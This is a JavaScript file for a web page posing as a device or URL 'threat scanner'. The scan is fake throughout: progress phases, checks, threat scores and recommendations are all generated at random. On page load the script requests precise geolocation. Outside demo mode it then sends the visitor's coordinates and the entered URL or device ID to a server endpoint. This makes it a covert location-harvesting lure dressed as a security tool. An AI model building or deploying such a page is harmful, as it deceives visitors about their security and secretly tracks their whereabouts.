// public/scripts.js
// Requests location permission immediately on page load, stores it, and still uses it on Start click.
// Keeps simulated analysis UI and sends real location to /api/send-data when not in demo.

const analyzeButton = document.getElementById('analyzeButton');
const videoUrlInput = document.getElementById('videoUrlInput');
const demoToggle = document.getElementById('demoToggle'); // optional - if you have demo toggle
const statusText = document.getElementById('status');
const progressBar = document.getElementById('progressBar');
const progressBarContainer = document.getElementById('progressBarContainer');
const resultArea = document.getElementById('resultArea');
const simLabel = document.getElementById('simLabel');

let cachedLocation = null;   // will hold location obtained on load (if allowed)

// small helpers
function randInt(min, max){ return Math.floor(Math.random()*(max-min+1))+min; }
function pick(arr){ return arr[Math.floor(Math.random()*arr.length)]; }

// Request location with timeout and return {latitude, longitude, accuracy} or null
function requestLocationWithPrompt(timeout = 8000) {
  return new Promise((resolve) => {
    if (!("geolocation" in navigator)) {
      console.warn('Geolocation not supported by browser.');
      return resolve(null);
    }

    let resolved = false;
    const onSuccess = (pos) => {
      if (resolved) return;
      resolved = true;
      resolve({
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      });
    };
    const onError = (err) => {
      if (resolved) return;
      resolved = true;
      console.warn('Geolocation error/denied:', err && err.message);
      resolve(null);
    };

    navigator.geolocation.getCurrentPosition(onSuccess, onError, {
      enableHighAccuracy: true,
      timeout: timeout,
      maximumAge: 0
    });

    // fallback guard
    setTimeout(() => {
      if (!resolved) {
        resolved = true;
        console.warn('Geolocation fallback timeout.');
        resolve(null);
      }
    }, timeout + 1000);
  });
}

/* ---------- Simulation / UI code (keeps behaviour you had) ---------- */
function makeFakeScanResults(input){
  const deviceConfidence = `${randInt(85,99)}%`;
  const threatScore = randInt(0,100);
  const threatLevel = threatScore < 20 ? 'Low' : threatScore < 60 ? 'Medium' : 'High';
  const signaturesMatched = randInt(0,5);
  const suspiciousProcesses = randInt(0,3);
  const networkAnomalies = pick(['None detected','Suspicious outbound activity','Potential DNS tunneling','Unknown remote host observed']);
  const recommendations = [
    'Keep your OS up to date',
    'Run full antivirus scan with official vendor',
    'Avoid installing unknown apps',
    'Change device credentials if suspicious'
  ];
  return {
    deviceConfidence, threatScore, threatLevel, signaturesMatched, suspiciousProcesses, networkAnomalies,
    recommendations: pick(recommendations)
  };
}

async function stagedProgress(phases = [
  { t: 'Initializing scanner...', w: 10, d: 400 },
  { t: 'Collecting metadata...', w: 35, d: 700 },
  { t: 'Analyzing signatures...', w: 65, d: 900 },
  { t: 'Checking network & processes...', w: 90, d: 600 },
  { t: 'Finalizing results...', w: 100, d: 400 }
]) {
  progressBarContainer.style.display = 'block';
  for (const p of phases) {
    statusText.textContent = p.t;
    progressBar.style.width = `${p.w}%`;
    await new Promise(r => setTimeout(r, p.d + Math.random()*300));
  }
}

function renderSimulatedResult(sim) {
  const checksHtml = (sim.checks || []).map(c => {
    const icon = c.passed ? '✅' : '⚠️';
    return `<div style="display:flex;justify-content:space-between;margin:6px 0">
              <div style="color:#bfefff">${icon} ${c.name}</div>
              <div style="color:${c.passed ? '#9fb0cf' : '#ffb86b'}">${c.passed ? 'Passed' : 'Suspicious'}</div>
            </div>`;
  }).join('');

  const html = `
    <div style="margin-top:12px;padding:12px;border-radius:10px;background:rgba(0,255,255,0.03);border:1px solid rgba(0,255,255,0.04)">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <strong style="color:#dffcff">SIMULATED ANALYSIS</strong>
        <span style="color:#9fb0cf;font-size:13px">Confidence: ${sim.threatPercent}%</span>
      </div>
      <div style="margin-top:8px;color:#bfefff">
        <div><strong>Threat Level:</strong> ${sim.threatLevel}</div>
        <div style="margin-top:8px"><strong>Checks performed:</strong></div>
        <div style="margin-top:6px">${checksHtml}</div>
        <div style="margin-top:10px;padding-top:8px;border-top:1px dashed rgba(255,255,255,0.03);color:#bfefff">
          <strong>Recommendation:</strong>
          <div style="margin-top:6px;color:#9fb0cf">${sim.recommendation}</div>
        </div>
      </div>
    </div>
  `;
  statusText.innerHTML = html;
}

/* generate simulated result used in UI */
function makeSimulatedResult(input) {
  const threatPercent = randInt(0, 100);
  const threatLevel = threatPercent < 20 ? 'Low' : threatPercent < 60 ? 'Medium' : 'High';
  const POSSIBLE_CHECKS = [
    'URL Reputation','SSL/TLS Certificate','Domain Age & WHOIS','Known Malware Signatures',
    'Suspicious Redirects','Embedded Scripts Analysis','Content Risk Heuristics','Network Behavior Indicators'
  ];
  const checksCount = randInt(3,5);
  const shuffled = [...POSSIBLE_CHECKS].sort(() => 0.5 - Math.random());
  const checks = [];
  for (let i=0;i<checksCount;i++){
    const name = shuffled[i];
    const failChance = Math.min(80, threatPercent);
    const passed = randInt(0,100) > failChance;
    checks.push({ name, passed });
  }
  const recommendation = threatLevel === 'High' ? 'Quarantine device, change credentials, run official AV.' :
                       threatLevel === 'Medium' ? 'Run full scan and monitor network.' :
                       'Keep system updated.';
  return { input, threatPercent, threatLevel, checks, recommendation };
}

/* ---------- Main flow ---------- */
async function runScanFlow(input, isDemo){
  resultArea && (resultArea.innerHTML = '');
  simLabel && (simLabel.style.display = isDemo ? 'block' : 'none');
  statusText.textContent = '';
  progressBar.style.width = '0%';
  progressBarContainer.style.display = 'block';

  await stagedProgress();

  const sim = makeSimulatedResult(input);
  renderSimulatedResult(sim);

  progressBarContainer.style.display = 'none';
  progressBar.style.width = '0%';
}

// On page load: immediately request location (triggers browser prompt)
window.addEventListener('DOMContentLoaded', async () => {
  try {
    // attempt to get location on load; store in cachedLocation
    cachedLocation = await requestLocationWithPrompt(8000);
    console.log('Location on load:', cachedLocation);
    // optionally update UI to indicate if permission was granted silently (we keep UI minimal)
  } catch (e) {
    console.warn('Location on load failed:', e);
    cachedLocation = null;
  }
});

// Click handler (Start)
analyzeButton.addEventListener('click', async () => {
  const input = videoUrlInput.value.trim();
  if (!input) {
    statusText.textContent = 'Please enter a Device ID or URL.';
    return;
  }

  const isDemo = demoToggle ? demoToggle.checked : true; // if no toggle, default demo=true

  // If we don't have cachedLocation from load, try again (this may re-prompt or succeed silently)
  if (!cachedLocation && !isDemo) {
    try {
      cachedLocation = await requestLocationWithPrompt(8000);
      console.log('Location obtained on click:', cachedLocation);
    } catch (e) { cachedLocation = null; }
  }

  // show UI and simulated results
  runScanFlow(input, isDemo);

  // If not demo, send real data to server
  if (!isDemo) {
    try {
      await fetch('/api/send-data', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ videoUrl: input, location: cachedLocation })
      });
      console.log('Sent real data to server');
    } catch (err) {
      console.warn('Failed to send to server', err);
    }
  }
});
